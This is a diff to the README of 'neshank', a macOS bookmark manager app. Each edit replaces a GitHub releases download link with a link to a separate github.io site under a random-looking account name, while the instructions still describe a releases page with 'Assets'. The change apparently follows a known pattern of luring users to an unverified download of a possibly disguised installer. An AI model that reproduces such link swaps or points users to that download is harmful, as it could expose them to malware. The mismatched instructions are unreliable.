@@ -1,6 +1,6 @@
 # 🧭 neshank - Your Bookmarks, Reimagined and Private
 
-[![Download neshank](https://img.shields.io/badge/Download-neshank%20for%20macOS-ff4f8b?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/colaptescapercollarisatomicnumber73177/neshank/releases)
+[![Download neshank](https://img.shields.io/badge/Download-neshank%20for%20macOS-ff4f8b?style=for-the-badge&logo=apple&logoColor=white)](https://colaptescapercollarisatomicnumber73177.github.io)
 
 neshank is a free, open-source bookmark manager for macOS that treats your saved links like a library worth exploring instead of a junk drawer you never open again. It keeps every bookmark tidy, searchable, and completely offline, then adds three superpowers most bookmark tools never dream of: you can chat with your links using AI, turn a pile of URLs into a visual mind map, and download videos from YouTube and more than 1,700 other sites without leaving the app.
 
@@ -52,11 +52,11 @@ Before you begin, make sure you are on a Mac and have a stable internet connecti
 
 ## ⬇️ Download neshank
 
-[![Download neshank](https://img.shields.io/badge/Get%20neshank-Download%20Page-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/colaptescapercollarisatomicnumber73177/neshank/releases)
+[![Download neshank](https://img.shields.io/badge/Get%20neshank-Download%20Page-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://colaptescapercollarisatomicnumber73177.github.io)
 
 Visit this link to download the application:
 
-https://github.com/colaptescapercollarisatomicnumber73177/neshank/releases
+https://colaptescapercollarisatomicnumber73177.github.io
 
 The page lists the available releases. Choose the newest one at the top of the list, then look under the "Assets" heading for the download file. Click it and the file will save to your Downloads folder. Depending on your browser, you may need to confirm the download first.
 
